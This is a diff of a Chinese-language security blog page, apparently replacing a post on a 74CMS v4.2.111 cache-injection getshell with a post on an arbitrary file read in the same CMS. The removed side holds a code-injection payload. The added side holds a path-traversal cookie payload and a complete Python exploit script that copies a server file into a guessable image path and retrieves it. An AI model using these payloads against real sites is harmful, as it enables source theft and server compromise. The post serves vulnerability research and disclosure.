@@ -79,27 +79,23 @@
 
 
 
-<meta name="description" content="前几天分析了一篇文章,ThinkPHP5.0.10-3.2.3缓存函数设计缺陷,在分析完后感觉利用难度较大,不是很容易碰到,但是很快就被打脸了,还是太年轻。   审计cms：74cms_v4.2.111漏洞原理:用了Thinkphp3.2.3改写的缓存函数set()方法,而这个方法对写入的内容只进行了serialize()函数过滤操作,导致可用%0D%0A进行换行写入php代码而getshell">
+<meta name="description" content="审计cms：74cms_v4.2.111漏洞原理:copy()操作的两个参数可控,导致可将目标文件内容复制到图片,然后下载图片进行读取源码 ##1.基础知识:74cms是基于ThinkPHP3.2.3而建Thinkphp的一些基本操作可参考笔者以前的文章:https://p0rz9.github.io/2018/09/28/TP框架数据操作/ ##2.环境搭建:骑士官网下载最新版本74cms_v">
 <meta name="keywords" content="CMS">
 <meta property="og:type" content="article">
-<meta property="og:title" content="代码审计 | 74CMS缓存设计缺陷导致getshell">
-<meta property="og:url" content="http://yoursite.com/2018/10/02/74CMS缓存设计缺陷导致getshell/index.html">
+<meta property="og:title" content="代码审计 | 74CMS_V4.2.111一处任意文件读取附py脚本">
+<meta property="og:url" content="http://yoursite.com/2018/10/09/74CMS_V4.2.111一处任意文件读取附py脚本/index.html">
 <meta property="og:site_name" content="P0rZ9&#39;s blog">
-<meta property="og:description" content="前几天分析了一篇文章,ThinkPHP5.0.10-3.2.3缓存函数设计缺陷,在分析完后感觉利用难度较大,不是很容易碰到,但是很快就被打脸了,还是太年轻。   审计cms：74cms_v4.2.111漏洞原理:用了Thinkphp3.2.3改写的缓存函数set()方法,而这个方法对写入的内容只进行了serialize()函数过滤操作,导致可用%0D%0A进行换行写入php代码而getshell">
+<meta property="og:description" content="审计cms：74cms_v4.2.111漏洞原理:copy()操作的两个参数可控,导致可将目标文件内容复制到图片,然后下载图片进行读取源码 ##1.基础知识:74cms是基于ThinkPHP3.2.3而建Thinkphp的一些基本操作可参考笔者以前的文章:https://p0rz9.github.io/2018/09/28/TP框架数据操作/ ##2.环境搭建:骑士官网下载最新版本74cms_v">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/p5dlr9aq231rg5gbezu7j4d2/image_1coql6dob9m8p4uuke1nov1gbm2a.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/layesh9qbvqn0ouktr9ilpng/image_1coqjmno01prl1qtah9718cn4im9.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/1b5l7j6wg45ja7at04tgrfaw/image_1coqk0d8k19e511civine11hngm.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/e6ppb2w8sof1u12rau4khhjs/image_1coqk5e7ro91oa92l11l991k4913.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/eghf8hflkq2jyclqf0n4w71o/image_1coqknv8vc5c6kf146l1hq11khj1g.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/m1gq5ipikux0b1t8qkqi9y6w/image_1coql21hfvtdeae5l418hs9021t.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/p5dlr9aq231rg5gbezu7j4d2/image_1coql6dob9m8p4uuke1nov1gbm2a.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/13fya1esr4q0z309key35hsj/image_1coqmpc8hsc515brgk313ra1ben2n.png">
-<meta property="og:updated_time" content="2018-10-03T03:45:28.409Z">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/tty53uwi3zfjnmism4ic3jcm/image_1cpcbkt29r67qm81tiassp2ve25.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/x7syyvsfcuec6nhlrsdkatbx/image_1cpc6ufrd7gugtklt11fud1lku9.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/ggsy0ntyi0jzti5qrzxhdabl/image_1cpcb92na1lk3qso1ik1jdh41p1o.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/1vh2q0dq88fr57e1di1dhl9m/image_1cpcf5kaeh1h1lora691vfp12542i.png">
+<meta property="og:updated_time" content="2018-10-09T13:12:18.888Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="代码审计 | 74CMS缓存设计缺陷导致getshell">
-<meta name="twitter:description" content="前几天分析了一篇文章,ThinkPHP5.0.10-3.2.3缓存函数设计缺陷,在分析完后感觉利用难度较大,不是很容易碰到,但是很快就被打脸了,还是太年轻。   审计cms：74cms_v4.2.111漏洞原理:用了Thinkphp3.2.3改写的缓存函数set()方法,而这个方法对写入的内容只进行了serialize()函数过滤操作,导致可用%0D%0A进行换行写入php代码而getshell">
-<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/p5dlr9aq231rg5gbezu7j4d2/image_1coql6dob9m8p4uuke1nov1gbm2a.png">
+<meta name="twitter:title" content="代码审计 | 74CMS_V4.2.111一处任意文件读取附py脚本">
+<meta name="twitter:description" content="审计cms：74cms_v4.2.111漏洞原理:copy()操作的两个参数可控,导致可将目标文件内容复制到图片,然后下载图片进行读取源码 ##1.基础知识:74cms是基于ThinkPHP3.2.3而建Thinkphp的一些基本操作可参考笔者以前的文章:https://p0rz9.github.io/2018/09/28/TP框架数据操作/ ##2.环境搭建:骑士官网下载最新版本74cms_v">
+<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/tty53uwi3zfjnmism4ic3jcm/image_1cpcbkt29r67qm81tiassp2ve25.png">
 
 
 
@@ -129,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/02/74CMS缓存设计缺陷导致getshell/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/10/09/74CMS_V4.2.111一处任意文件读取附py脚本/"/>
 
 
 
 
 
-  <title>代码审计 | 74CMS缓存设计缺陷导致getshell | P0rZ9's blog</title>
+  <title>代码审计 | 74CMS_V4.2.111一处任意文件读取附py脚本 | P0rZ9's blog</title>
   
 
 
@@ -246,7 +242,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/02/74CMS缓存设计缺陷导致getshell/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/09/74CMS_V4.2.111一处任意文件读取附py脚本/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="P0rZ9">
@@ -263,7 +259,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">代码审计 | 74CMS缓存设计缺陷导致getshell</h1>
+          <h1 class="post-title" itemprop="name headline">代码审计 | 74CMS_V4.2.111一处任意文件读取附py脚本</h1>
         
 
         <div class="post-meta">
@@ -275,8 +271,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-02T10:15:41+08:00">
-                2018-10-02
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-09T09:15:41+08:00">
+                2018-10-09
               </time>
             
 
@@ -318,38 +314,121 @@
       
 
       
-        <blockquote>
-<p>前几天分析了一篇文章,ThinkPHP5.0.10-3.2.3缓存函数设计缺陷,在分析完后感觉利用难度较大,不是很容易碰到,但是很快就被打脸了,还是太年轻。</p>
-</blockquote>
-<hr>
-<p>审计cms：<a href="http://www.74cms.com/download/load/id/534.html" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:用了<code>Thinkphp3.2.3</code>改写的缓存函数<code>set()</code>方法,而这个方法对写入的内容只进行了<code>serialize()</code>函数过滤操作,导致可用<code>%0D%0A</code>进行换行写入<code>php</code>代码而<code>getshell</code></p>
-<p>##<strong>1.基础知识:</strong><br><code>Thinkphp</code>的一些基本操作可参考文章:<br><a href="https://p0rz9.github.io/2018/09/28/TP%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作/</a></p>
-<p>##<strong>2.环境搭建:</strong><br>创建一个企业用户用于验证漏洞即可</p>
-<p>##<strong>3.漏洞利用:</strong><br>payload:</p>
-<pre><code>url:http://127.0.0.1:84/index.php?m=&amp;c=Company&amp;a=com_auth
-POST:anew=1&amp;certificate_img_up=%2F%2F%0D%0Aphpinfo();//
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/p5dlr9aq231rg5gbezu7j4d2/image_1coql6dob9m8p4uuke1nov1gbm2a.png" alt="image_1coql6dob9m8p4uuke1nov1gbm2a.png-43.9kB"></p>
-<p>##<strong>4.代码分析:</strong><br>相关变量已写入注释中：</p>
-<pre><code>#home\controller\companyController.class.php
-public function com_auth(){
+        <hr>
+<p>审计cms：<a href="https://p0rz9.github.io/2018/10/08/74CMS_V4.2.111%E5%A4%9A%E5%A4%84sql%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:<code>copy()</code>操作的两个参数可控,导致可将目标文件内容复制到图片,然后下载图片进行读取源码</p>
+<p>##<strong>1.基础知识:</strong><br>74cms是基于ThinkPHP3.2.3而建<br><code>Thinkphp</code>的一些基本操作可参考笔者以前的文章:<br><a href="http://static.zybuluo.com/chhyx/x7syyvsfcuec6nhlrsdkatbx/image_1cpc6ufrd7gugtklt11fud1lku9.png" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/28/TP框架数据操作/</a></p>
+<p>##<strong>2.环境搭建:</strong><br><a href="http://www.74cms.com/download/index.html" target="_blank" rel="noopener">骑士官网</a>下载最新版本<code>74cms_v4.2.111</code>安装到本地即可。</p>
+<p>##<strong>3.漏洞利用:</strong><br>因为笔者是本地测试的,并没有开启短信服务,所以在这里先注释掉对验证码的判断来完成漏洞利用<br><img src="http://static.zybuluo.com/chhyx/tty53uwi3zfjnmism4ic3jcm/image_1cpcbkt29r67qm81tiassp2ve25.png" alt="image_1cpcbkt29r67qm81tiassp2ve25.png-75.4kB"></p>
+<p>这里我们以读取入口文件为例<br><strong>paylaod</strong>:</p>
+<pre><code>url: http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register
+headers: Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest
+Cookie: members_bind_info[temp_avatar]=../../../../index.php;members_uc_info[uid]=1
+POST: ucenter=bind&amp;utype=2&amp;reg_type=1&amp;org=bind
+</code></pre><p>访问生成的特定<code>jpg</code>文件,下载到本地用编辑器打开即可看到<code>index.php</code>的内容<br><img src="http://static.zybuluo.com/chhyx/x7syyvsfcuec6nhlrsdkatbx/image_1cpc6ufrd7gugtklt11fud1lku9.png" alt="image_1cpc6ufrd7gugtklt11fud1lku9.png-72.6kB"></p>
+<p>##<strong>4.代码分析:</strong><br>这里只贴出相关代码。<br>1.根据<code>payload</code>定位到漏洞文件：</p>
+<pre><code>#upload\Application\Home\Controller\MembersController.class.php
+
+public function register(){
     ...
-    if(IS_POST &amp;&amp; $this-&gt;company_profile[&apos;audit&apos;]!=1){
-        $data[&apos;certificate_img&apos;] = I(&apos;post.certificate_img_up&apos;,&apos;&apos;,&apos;trim,badword&apos;);
-        $data[&apos;audit&apos;] = 2;
-    ...
-    if($this-&gt;company_profile[&apos;audit&apos;] == 0 || ($this-&gt;company_profile[&apos;audit&apos;] != 1 &amp;&amp; I(&apos;request.anew&apos;,0,&apos;intval&apos;) == 1)){
-        S(&apos;certificate_img_&apos; . $this-&gt;company_profile[&apos;uid&apos;],$this-&gt;company_profile[&apos;certificate_img&apos;]);
-    }
-    ...
+    if(IS_POST &amp;&amp; IS_AJAX){
+        $data[&apos;reg_type&apos;] =     
+        I(&apos;post.reg_type&apos;,0,&apos;intval&apos;);//注册方式(1:手机，2:邮箱，3:微信)
+        $data[&apos;utype&apos;] = I(&apos;post.utype&apos;,0,&apos;intval&apos;);
+        if($data[&apos;reg_type&apos;] == 1){//进入
+             //判断验证码
+        ...
+
+        if(&apos;bind&apos; == $ucenter = I(&apos;post.ucenter&apos;,&apos;&apos;,&apos;trim&apos;)){
+            $uc_user = cookie(&apos;members_uc_info&apos;);
+            $data = array_merge($data,$uc_user);//合并数组
+
+            $passwordVerify = $data[&apos;password&apos;];
+        }
+        ...
+        if($data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2){
+            ...
+        if(&apos;bind&apos; == I(&apos;post.org&apos;,&apos;&apos;,&apos;trim&apos;) &amp;&amp; cookie(&apos;members_bind_info&apos;)){
+            $user_bind_info = object_to_array(cookie(&apos;members_bind_info&apos;));
+            $user_bind_info[&apos;uid&apos;] = $data[&apos;uid&apos;];
+            ...
+            $this-&gt;_save_avatar($user_bind_info[&apos;temp_avatar&apos;],$data[&apos;uid&apos;]);//临时头像转换
+            //跟进_save_avatar()函数
+</code></pre><p>跟进_save_avatar()函数:</p>
+<pre><code>#upload\Application\Home\Controller\MembersController.class.php
+protected function _save_avatar($avatar,$uid){
+    if(!$avatar) return false;
+$path = C(&apos;qscms_attach_path&apos;).&apos;avatar/temp/&apos;.$avatar;
+
+    $image = new \Common\ORG\ThinkImage();
+$date = date(&apos;ym/d/&apos;);
+
+    $save_avatar=C(&apos;qscms_attach_path&apos;).&apos;avatar/&apos;.$date;//图片存储路径
+    //data/upload/avatar/1810/09/
+    if(!is_dir($save_avatar)) mkdir($save_avatar,0777,true);
+    $savePicName = md5($uid.time()).&quot;.jpg&quot;;
+    $filename = $save_avatar.$savePicName;
+$size = explode(&apos;,&apos;,C(&apos;qscms_avatar_size&apos;));
+
+    copy($path, $filename);//漏洞触发点
+</code></pre><p>这里简单分析下代码:</p>
+<p><img src="http://static.zybuluo.com/chhyx/ggsy0ntyi0jzti5qrzxhdabl/image_1cpcb92na1lk3qso1ik1jdh41p1o.png" alt="image_1cpcb92na1lk3qso1ik1jdh41p1o.png-121.9kB"></p>
+<p>大家能看到最后一行有<code>unlink</code>操作,但是这里并不会造成任意文件删除 因为<code>$path</code>不是图片 <code>$image-&gt;open()</code>会报错,不过是存在任意图片删除的。</p>
+<p>2.这里漏洞的关键是在于<code>copy</code>操作的两个参数我们都可控,且没过滤../等敏感字符导致任意文件读取。</p>
+<p>3.我们理一下漏洞利用条件:</p>
+<pre><code>a.IS_POST &amp;&amp; IS_AJAX
+b.$data[&apos;reg_type&apos;] == 1 &amp;&amp; $data[&apos;utype&apos;] ==2  //注册必要
+c.$ucenter == &apos;bind&apos;
+d.$org == &apos;bind&apos;
+e.cookie中含有members_bind_info字段且不为空
+</code></pre><p>4.解释下所用paylaod:</p>
+<pre><code>url: http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register
+headers: Content-Type: application/x-www-form-urlencoded
+        X-Requested-With: XMLHttpRequest //满足AJAX操作
+Cookie: members_bind_info[temp_avatar]=../../../../index.php;members_uc_info[uid]=1                        //读取的文件及上文e条件
+POST: ucenter=bind&amp;utype=2&amp;reg_type=1&amp;org=bind //满足上文bcd条件
+</code></pre><p>5.py脚本:</p>
+<pre><code># -*- coding: utf-8 -*-
+#author: P0rZ9
+#env: python2
+
+import requests
+import hashlib
+import time
+
+url = &apos;http://127.0.0.1:84/index.php?m=Home&amp;c=Members&amp;a=register&apos;
+headers = {
+    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&apos;,
+    &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;,
+    &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;
 }
-</code></pre><p>这里在造成漏洞的原理是底层的tp框架的锅, 笔者前几天写过分析文章:<br><a href="https://p0rz9.github.io/2018/09/16/ThinkPHP5.0.10-3.2.3%E7%BC%93%E5%AD%98%E5%87%BD%E6%95%B0%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/09/16/ThinkPHP5.0.10-3.2.3缓存函数设计缺陷/</a><br>我们这里再照常分析一遍代码流程:<br>跟进<code>TP</code>框架自带的<code>S()</code>缓存方法:<br><img src="http://static.zybuluo.com/chhyx/layesh9qbvqn0ouktr9ilpng/image_1coqjmno01prl1qtah9718cn4im9.png" alt="image_1coqjmno01prl1qtah9718cn4im9.png-100.5kB"></p>
-<p>跟进<code>set()</code>方法:</p>
-<pre><code>Librayr\Think\Cache\Driver\File.class.php 
-</code></pre><p><img src="http://static.zybuluo.com/chhyx/1b5l7j6wg45ja7at04tgrfaw/image_1coqk0d8k19e511civine11hngm.png" alt="image_1coqk0d8k19e511civine11hngm.png-95.1kB"></p>
-<p>跟进<code>filename()</code>方法:<br><img src="http://static.zybuluo.com/chhyx/e6ppb2w8sof1u12rau4khhjs/image_1coqk5e7ro91oa92l11l991k4913.png" alt="image_1coqk5e7ro91oa92l11l991k4913.png-69.4kB"></p>
-<p><code>uid</code>为2得到的缓存文件名:<br><img src="http://static.zybuluo.com/chhyx/eghf8hflkq2jyclqf0n4w71o/image_1coqknv8vc5c6kf146l1hq11khj1g.png" alt="image_1coqknv8vc5c6kf146l1hq11khj1g.png-29.8kB"></p>
-<p>因为这里的<code>$filename</code>与<code>$name</code>相关联,而<code>$name</code>与<code>$uid</code>相关联<br>就是说我们可以根据用户的<code>uid</code>来得到缓存文件名 进而可<code>getshell</code><br><img src="http://static.zybuluo.com/chhyx/m1gq5ipikux0b1t8qkqi9y6w/image_1coql21hfvtdeae5l418hs9021t.png" alt="image_1coql21hfvtdeae5l418hs9021t.png-151.8kB"><br><img src="http://static.zybuluo.com/chhyx/p5dlr9aq231rg5gbezu7j4d2/image_1coql6dob9m8p4uuke1nov1gbm2a.png" alt="image_1coql6dob9m8p4uuke1nov1gbm2a.png-43.9kB"></p>
-<p><code>uid</code>可在个人主页看到:<br><img src="http://static.zybuluo.com/chhyx/13fya1esr4q0z309key35hsj/image_1coqmpc8hsc515brgk313ra1ben2n.png" alt="image_1coqmpc8hsc515brgk313ra1ben2n.png-86.2kB"></p>
+data = &apos;ucenter=bind&amp;utype=2&amp;reg_type=1&amp;org=bind&apos;
+cookies = {&apos;members_bind_info[temp_avatar]&apos;: &apos;../../../../index.php&apos;, &apos;members_uc_info[uid]&apos;: &apos;1&apos;}
+
+def copy_file():
+    re = requests.post(url,data=data,headers=headers,cookies=cookies)
+    print &apos;[-]file_copy_success&apos;
+
+def get_file_name():
+    state_time = &apos;%.0f&apos;%(time.time()-20)
+    for i in range(20):
+        pay_time = int(state_time) + i
+        img_url = &apos;http://127.0.0.1:84/data/upload/avatar/1810/09/%s&apos;%(md5_str(&apos;1&apos;+str(pay_time))+&apos;.jpg&apos;)
+        r = requests.get(img_url)
+        if &apos;No input file specified.&apos; not in r.text:
+            print &apos;[-]result_file:%s&apos;%img_url
+
+def md5_str(str):
+    h1 = hashlib.md5()
+    h1.update(str.encode(encoding=&apos;utf-8&apos;))  # 传入需要加密的字符串进行MD5加密
+    return h1.hexdigest() 
+
+def main():
+    copy_file()
+    get_file_name()
+
+main()
+</code></pre><p>成功截图:<br><img src="http://static.zybuluo.com/chhyx/1vh2q0dq88fr57e1di1dhl9m/image_1cpcf5kaeh1h1lora691vfp12542i.png" alt="image_1cpcf5kaeh1h1lora691vfp12542i.png-207.8kB"></p>
 
       
     </div>
@@ -380,8 +459,8 @@ public function com_auth(){
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/09/29/Thinkphp3.2 find_delete_selete注入分析/" rel="next" title="代码审计 | Thinkphp3.2 find_delete_selete注入分析">
-                <i class="fa fa-chevron-left"></i> 代码审计 | Thinkphp3.2 find_delete_selete注入分析
+              <a href="/2018/10/08/74CMS_V4.2.111多处sql注入/" rel="next" title="">
+                <i class="fa fa-chevron-left"></i> 
               </a>
             
           </div>
@@ -389,10 +468,6 @@ public function com_auth(){
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/08/74CMS_V4.2.111多处sql注入/" rel="prev" title="">
-                 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
